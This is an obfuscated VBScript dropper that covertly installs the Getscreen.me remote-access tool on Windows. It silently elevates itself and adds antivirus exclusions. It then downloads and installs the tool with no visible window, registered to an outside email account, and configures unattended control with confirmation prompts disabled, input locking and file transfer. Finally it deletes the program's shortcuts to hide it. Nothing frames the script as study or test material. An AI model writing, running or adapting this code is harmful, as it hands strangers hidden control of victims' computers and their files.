Option Explicit
Const x7k3m9 = "https://getscreen.me/download/getscreen.exe"
Const p4n8q2 = "cdenney@igc.org"
Const w5j1r6 = "name='My Computer' language=en autostart=true nonadmin=true control=true fast_access=false file_transfer=true audio_calls=false lock_input=true disable_confirmation=true auto_wallpaper_hide=true"
Const b9v2c4 = True
Const h3w8n5 = True
Const t6y4p1 = True
Const d2f7k9 = True

Dim a3m8p2, q9r4t6, u1v5w8, x2y7z9, b4c6d1, e8f3g7, h2i9j5, k1l6m4, n8o3p7, q5r9s2, t4u8v1, w6x9y3

Sub z7a2b5(c8d4e9)
    If t6y4p1 Then
        Dim f1g6h3
        Set f1g6h3 = w6x9y3.OpenTextFile(n8o3p7, 8, True)
        f1g6h3.WriteLine Now & " | " & c8d4e9
        f1g6h3.Close
    End If
End Sub

Sub i4j8k2()
    On Error Resume Next
    Dim l5m9n3, o2p7q4, r8s1t6
    Dim u3v9w2, x5y8z1, a7b2c8
    
    u3v9w2 = a3m8p2.ExpandEnvironmentStrings("%PUBLIC%\Desktop")
    If Not w6x9y3.FolderExists(u3v9w2) Then
        u3v9w2 = a3m8p2.ExpandEnvironmentStrings("%ALLUSERSPROFILE%\Desktop")
    End If
    
    d6e1f7 u3v9w2 & "\Getscreen*.lnk"
    d6e1f7 a3m8p2.ExpandEnvironmentStrings("%USERPROFILE%\Desktop\Getscreen*.lnk")
    
    x5y8z1 = a3m8p2.ExpandEnvironmentStrings("%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs")
    d6e1f7 x5y8z1 & "\Getscreen*.lnk"
    d6e1f7 x5y8z1 & "\Getscreen.me*.lnk"
    
    d6e1f7 a3m8p2.ExpandEnvironmentStrings("%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Getscreen*.lnk")
    
    z7a2b5 "Shortcuts cleanup completed"
End Sub

Sub d6e1f7(g3h8i4)
    On Error Resume Next
    Dim j9k2l7, m4n8o1, p3q9r5
    Dim s7t2u8, v5w9x1
    
    s7t2u8 = Left(g3h8i4, InStrRev(g3h8i4, "\") - 1)
    v5w9x1 = Mid(g3h8i4, InStrRev(g3h8i4, "\") + 1)
    
    If Not w6x9y3.FolderExists(s7t2u8) Then Exit Sub
    
    Set j9k2l7 = w6x9y3.GetFolder(s7t2u8)
    Set m4n8o1 = j9k2l7.Files
    
    For Each p3q9r5 In m4n8o1
        If LCase(Right(p3q9r5.Name, 4)) = ".lnk" Then
            If InStr(LCase(p3q9r5.Name), "getscreen") > 0 Then
                z7a2b5 "Deleting shortcut: " & p3q9r5.Path
                w6x9y3.DeleteFile p3q9r5.Path, True
            End If
        End If
    Next
    
    Set m4n8o1 = Nothing
    Set j9k2l7 = Nothing
End Sub

k1l6m4 = False
If WScript.Arguments.Count > 0 Then
    k1l6m4 = (LCase(WScript.Arguments(0)) = "elevated")
End If
If Not k1l6m4 Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
    WScript.Quit 0
End If

q9r4t6 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\getscreen_install.exe"
n8o3p7 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\getscreen_install.log"
Set w6x9y3 = CreateObject("Scripting.FileSystemObject")
Set a3m8p2 = CreateObject("WScript.Shell")

If t6y4p1 Then
    w6x9y3.CreateTextFile(n8o3p7, True).Write ""
    z7a2b5 "Log file: " & n8o3p7
End If

On Error Resume Next

If b9v2c4 Then
    z7a2b5 "Adding AV exclusion..."
    a3m8p2.Run "powershell -NoProfile -Command ""Add-MpPreference -ExclusionPath '" & q9r4t6 & "' -ErrorAction SilentlyContinue""", 0, True
    a3m8p2.Run "powershell -NoProfile -Command ""Add-MpPreference -ExclusionPath '" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "' -ErrorAction SilentlyContinue""", 0, True
End If

z7a2b5 "Downloading..."
Set e8f3g7 = CreateObject("MSXML2.ServerXMLHTTP.6.0")
If Err.Number <> 0 Then
    z7a2b5 "FAIL: HTTP object - " & Err.Description
    If Not h3w8n5 Then MsgBox "HTTP failed: " & Err.Description, vbCritical
    WScript.Quit 1
End If

e8f3g7.Open "GET", x7k3m9, False
e8f3g7.Send

z7a2b5 "HTTP Status=" & e8f3g7.Status
If e8f3g7.Status <> 200 Then
    z7a2b5 "FAIL: Download - Status " & e8f3g7.Status
    If Not h3w8n5 Then MsgBox "Download failed. Status: " & e8f3g7.Status, vbCritical
    WScript.Quit 1
End If

Set h2i9j5 = CreateObject("ADODB.Stream")
h2i9j5.Type = 1
h2i9j5.Open
h2i9j5.Write e8f3g7.ResponseBody
h2i9j5.SaveToFile q9r4t6, 2
h2i9j5.Close
Set h2i9j5 = Nothing
Set e8f3g7 = Nothing

If Not w6x9y3.FileExists(q9r4t6) Then
    z7a2b5 "FAIL: File not saved - AV may have purged it"
    If Not h3w8n5 Then MsgBox "File not saved. AV may have purged it.", vbCritical
    WScript.Quit 1
End If

z7a2b5 "Download OK - File size: " & w6x9y3.GetFile(q9r4t6).Size & " bytes"

u1v5w8 = """" & q9r4t6 & """ -install -register " & p4n8q2
z7a2b5 "Running: " & u1v5w8
q5r9s2 = a3m8p2.Run(u1v5w8, 0, True)
z7a2b5 "Install exit code=" & q5r9s2

If q5r9s2 = 0 Then
    z7a2b5 "Waiting for installation to complete..."
    WScript.Sleep 5000
    
    u1v5w8 = """C:\Program Files\Getscreen.me\getscreen.exe"" -config """ & w5j1r6 & """"
    z7a2b5 "Running config: " & Left(u1v5w8, 80) & "..."
    a3m8p2.Run u1v5w8, 0, True
    
    If d2f7k9 Then
        z7a2b5 "Removing shortcuts..."
        i4j8k2
    End If
End If

z7a2b5 "=== END ==="

w6x9y3.DeleteFile q9r4t6, True
Set w6x9y3 = Nothing
Set a3m8p2 = Nothing

WScript.Quit q5r9s2